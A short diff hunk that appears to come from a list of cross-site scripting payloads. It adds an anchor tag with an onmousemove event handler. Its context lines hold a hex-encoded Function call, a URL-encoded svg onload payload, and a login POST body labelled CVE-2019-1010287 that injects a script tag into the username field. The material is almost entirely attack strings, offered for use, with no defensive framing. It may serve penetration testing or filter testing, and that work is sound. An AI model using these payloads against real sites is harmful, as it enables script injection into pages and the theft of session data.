@@ -73,6 +73,9 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
  =%3Csvg/onload=alert(1)%3E
 
+<a href="@bing.com" onmousemove="alert('Mouse moved!')">Click me</a>
+
+
  POST BASED CVE-2019-1010287
 """username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login""" 
 
